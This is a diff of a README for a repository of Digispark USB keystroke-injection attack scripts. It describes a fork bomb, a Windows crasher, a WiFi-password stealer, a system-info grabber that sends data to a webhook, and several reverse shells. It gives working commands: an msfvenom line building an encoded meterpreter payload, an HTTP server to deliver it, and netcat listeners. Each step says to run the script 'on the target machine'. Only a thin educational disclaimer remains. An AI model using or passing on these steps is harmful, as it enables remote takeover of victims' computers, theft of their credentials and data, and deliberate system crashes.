@@ -3,11 +3,11 @@
 <br>
 
 >
->This repository focuses on the storage of scripts for the digispark and for the dissemination of knowledge. I will update over time as I gain more experience :).
+>This repository focuses on the storage of scripts for the digispark and for the dissemination of knowledge. I will update over time as I gain more experience! :)
 >
 
 >
->Obs: These scripts are for educational purposes only. Use them at your own risk. I will not be responsible for your actions!
+>Obs: These scripts are for educational purposes only. Use them at your own risk!
 >
 
 >
@@ -22,11 +22,27 @@
 
 <br>
 
-<body>
-   <h2 align="left"> Dependences:</h2>
+<h2 align="left"> Preview</h2>
 
-  <br>
-  
+ <br>
+
+* Fakeupdate :trollface:
+* ForkBomb :boom:
+* Grab-WindowsSysinfo :alien:
+* Metasploit-Revshell :broken_heart:
+* Netcat-Revshell :cat:
+* Revshell-ps1 :rat:
+* Steal-Wifi-Passwd :smiling_imp:
+* Wallpaper-Prank :dizzy_face:
+* Windows-Crasher :boom:
+
+<br>
+
+<body>
+   <h2 align="left"> Dependences</h2>
+
+<br>
+	
   >Digistump packages:<a href="https://github.com/digistump/DigistumpArduino"> DigistumpArduino</a>
   >
   >
@@ -40,140 +56,176 @@
 
   <br>
 
-  <h2 align="left"> Digispark Scripts:</h2>
+  <h2 align="left"> Digispark Scripts</h2>
 <ol type="I">
 
   <br>
 
-  <li>Fakeupdate</li>
+   <h4 align="left"><li>Fakeupdate</li></h4>
 
   <br>
 
-  **This Fakeupdate script opens a fake Windows update website and is configured to be full screen.**
-
-  **Run the digispark and be fun :)**
+  This Fakeupdate script opens a fake Windows update website and is configured to be full screen.
 
   <br>
 
-  <li>ForkBomb</li>
+  **Upload the "Fakeupdate" script to digispark and run it on the target machine.**
 
   <br>
 
-  **This fork bomb script will repeat itself until the pc freezes or crashes.**
-
-  **Upload the fork bomb script to digispark and run it.**
-
-  **⛔Take care with this script and have fun :).⛔**
+   <h4 align="left"><li>ForkBomb</li></h4>
 
   <br>
 
-  <li>Grab-WindowsSysinfo</li>
+  This Fork Bomb script will repeat itself until the pc freezes or crashes.
 
   <br>
 
-  **Copy and pase your WebHook link on the digispark script.**
-
-  **Run the digispark and copy the informations to a file.**
+  **Upload the "Fork Bomb" script to digispark and run it.**
 
   <br>
 
-  <li>Metasploit-Revshell</li>
+   <h4 align="left"><li>Grab-WindowsSysinfo</li></h4>
 
   <br>
 
-  **Create your own metasploitable file, set your IP and listener port and  run de .rc script:**
+  Copy and pase your WebHook link on the digispark script.
+
+  <br>
+
+  **Upload the "Grab-WindowsSysinfo" script to digispark and run it on the target machine.**
+
+  <br>
+
+   <h4 align="left"><li>Metasploit-Revshell</li></h4>
+
+  <br>
+
+  Create your own metasploitable file:
 
   <br>
 
 ``` 
-msfconsole -r meta.rc
+msfvenom --platform windows -p windows/meterpreter/reverse_tcp lhost=YOURIP lport=443 -e x86/shikata_ga_nai -i 7 -f exploit.exe -o exploit.exe
 ```
 
-  <br>
+ <br>
 
-  **Then run the digispark.**
+  Edit the meta.rc file and run the msfconsole:
 
-  <br>
+ <br>
 
-  <li>Netcat-Revshell</li>
+``` 
+msfdb reinit && msfconsole -r meta.rc
+```
 
-  <br>
+ <br>
 
-  **Set your http server to download NetCat on victim's machine:**
+  Set your http request on the script (http://yourip/exploit.exe) and listen on your host:
 
-  <br>
+ <br>
 
 ``` 
 python3 -m http.server 80
 ```
 
-  <br>
+ <br>
 
-  **Run the digispark and listen to the port:**
+  **Upload the "Metasploit-Revshell" script to digispark and run it on the target machine.**
 
-  <br>
+ <br>
 
-``` 
-nc -lvnp port
-```
+   <h4 align="left"><li>Netcat-Revshell</li></h4>
 
-  <br>
+ <br>
 
-  <li>Revshell-ps1</li>
+  Set your http server to download NetCat on victim's machine:
 
-  <br>
-
-  **Save the .ps1 script on your own secret gist repository, copy and paste the raw link on the Arduino IDE.**
-
-  **Run the digispark and listen to the port:**
-
-  <br>
+ <br>
 
 ``` 
-nc -lvnp port
+python3 -m http.server 80
 ```
 
-  <br>
+ <br>
 
-  <li>Steal-Wifi-Passwd</li>
+  Listen to the port:
 
-  <br>
+ <br>
 
-  **Copy and pase your WebHook link on the digispark script.**
+``` 
+nc -lvnp 443 // ncat -lvnp 443 // pwncat-cs -lp 443
+```
 
-  **Run the digispark and copy the WiFi passwd informations to a file.**
+ <br>
 
-  <br>
+**Upload the "Netcat-Revshell" script to digispark and run it on the target machine.**
 
-  <li>Wallpaper-Prank</li>
+ <br>
+
+   <h4 align="left"><li>Revshell-ps1</li></h4>
+
+ <br>
+
+  Save the .ps1 script on your own secret gist repository, copy and paste the raw link on the Arduino IDE.
+
+ <br>
+
+  Listen to the port:
+
+ <br>
+
+``` 
+nc -lvnp 443 // ncat -lvnp 443 // pwncat-cs -lp 443
+```
+
+ <br>
+
+**Upload the "Revshell-ps1" script to digispark and run it on the target machine.**
+
+ <br>
+
+   <h4 align="left"><li>Steal-Wifi-Passwd</li></h4>
+
+ <br>
+
+  Copy and pase your WebHook link on the digispark script.
+
+ <br>
+
+  **Upload the "Steal-Wifi-Passwd" script to digispark and run it on the target machine.**
+
+ <br>
+
+   <h4 align="left"><li>Wallpaper-Prank</li></h4>
   
-  <br>
+ <br>
 
-  **This Wallpaper Prank script takes a picture of the desktop, saves it as the background and hides all the icons.**
+  This Wallpaper Prank script takes a picture of the desktop, saves it as the background and hides all the icons.
 
-  **Run the digispark and have fun :)**
+ <br>
 
-  <br>
+  **Upload the "Wallpaper-Prank" script to digispark and run it on the target machine.**
+
+ <br>
   
-  <li>Windows-Crasher</li>
+   <h4 align="left"><li>Windows-Crasher</li></h4>
   
-  <br>
+ <br>
 
-  **This Windows Crasher script creates a .bat payload on the temporary dir and crashes de Windows**
+  This Windows Crasher script creates a .bat payload on the temporary dir and crashes de Windows.
 
-  **Upload the Windows Crasher script to digispark and run it.**
+ <br>
 
-  **⛔Take care with this script and have fun :).⛔**
+  **Upload the "Windows-Crasher" script to digispark and run it on the target machine.**
 
-  <br>
+ <br>
 
 </ol>
 
-  <br>
-
 ## References and Credits
   
-  <br>
+ <br>
 
   ><a href="https://github.com/CedArctic/DigiSpark-Scripts"> CedArctic</a>
   >
@@ -181,9 +233,7 @@ nc -lvnp port
   >
   ><a href="https://github.com/Gadotti/DigisparkScripts"> Gadotti</a>
 
-  <br>
-
-<h1 align="center">🚧⛔ Under development! ⛔🚧</h1>
+ <br>
 
 </body>
 </html>
